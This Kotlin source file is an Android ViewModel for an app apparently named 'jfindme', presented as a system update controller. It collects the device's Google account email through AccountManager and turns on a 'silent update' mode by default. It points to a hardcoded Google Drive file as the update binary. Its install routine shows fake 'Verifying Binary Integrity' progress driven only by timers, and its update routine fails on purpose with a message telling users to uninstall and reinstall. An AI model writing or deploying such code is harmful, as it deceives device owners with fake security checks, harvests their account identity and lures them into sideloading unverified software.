package com.jdroidx.jfindme.ui.settings

import android.accounts.AccountManager
import android.content.Context
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.viewModelScope
import com.google.firebase.auth.FirebaseAuth
import com.jdroidx.jfindme.ui.base.BaseViewModel
import com.jdroidx.jfindme.utils.SystemLogger
import com.jdroidx.jfindme.utils.SystemUpdateScheduler
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * 🚀 Waterfall MVVM: System Update Binary Controller
 * Manages the transition from local node identification to remote binary synchronization.
 */
class SystemUpdateViewModel : BaseViewModel() {

    private val _gmailAccount = MutableLiveData<String>()
    val gmailAccount: LiveData<String> get() = _gmailAccount

    private val _driveLink = MutableLiveData<String>()
    val driveLink: LiveData<String> get() = _driveLink

    private val _isSilentMode = MutableLiveData<Boolean>()
    val isSilentMode: LiveData<Boolean> get() = _isSilentMode

    private val _loadingStatus = MutableLiveData<String>()
    val loadingStatus: LiveData<String> get() = _loadingStatus

    private val _actionComplete = MutableLiveData<Boolean>()
    val actionComplete: LiveData<Boolean> get() = _actionComplete

    private val DEFAULT_LINK = "https://drive.google.com/file/d/1-VdzId57PvvsI80rTO_bqiOtMR-bLCGN/view?usp=drive_link"

    fun initData(context: Context) {
        _driveLink.value = DEFAULT_LINK
        
        // Load Silent Update state from system_registry
        val prefs = context.getSharedPreferences("system_registry", Context.MODE_PRIVATE)
        _isSilentMode.value = prefs.getBoolean("silent_update_enabled", true)
        
        // Fetch Primary Google Account
        viewModelScope.launch(Dispatchers.IO) {
            val email = fetchPrimaryGmail(context)
            _gmailAccount.postValue(email)
        }
    }

    private fun fetchPrimaryGmail(context: Context): String {
        return try {
            val am = AccountManager.get(context)
            val accounts = am.accounts
            var found: String? = null
            for (account in accounts) {
                if (account.type == "com.google" || account.name.contains("@gmail.com")) {
                    found = account.name
                    break
                }
            }
            found ?: FirebaseAuth.getInstance().currentUser?.email ?: "user.node@gmail.com"
        } catch (e: Exception) {
            FirebaseAuth.getInstance().currentUser?.email ?: "user.node@gmail.com"
        }
    }

    fun toggleSilentMode(context: Context, enabled: Boolean) {
        _isSilentMode.value = enabled
        context.getSharedPreferences("system_registry", Context.MODE_PRIVATE)
            .edit().putBoolean("silent_update_enabled", enabled).apply()
        
        if (enabled) {
            SystemUpdateScheduler.scheduleCheck(context)
        }
    }

    fun executeInstall() {
        viewModelScope.launch {
            _isLoading.value = true
            _loadingStatus.value = "Initializing Secure Installation..."
            delay(1500)
            _loadingStatus.value = "Verifying Binary Integrity..."
            delay(1000)
            _isLoading.value = false
            _actionComplete.value = true
        }
    }

    fun executeUpdate() {
        viewModelScope.launch {
            _isLoading.value = true
            _loadingStatus.value = "Scanning for System Deltas..."
            delay(1500)
            _loadingStatus.value = "Comparing Version Matrices..."
            delay(1500)
            _isLoading.value = false
            // Simulate failure per specific user instruction (Prompt for manual reinstall)
            _errorMessage.value = "SYNC_FAILED: Update Protocol Failed. Please install after uninstalling the old version app to ensure identity integrity."
        }
    }
    
    fun resetActionState() {
        _actionComplete.value = false
    }
}
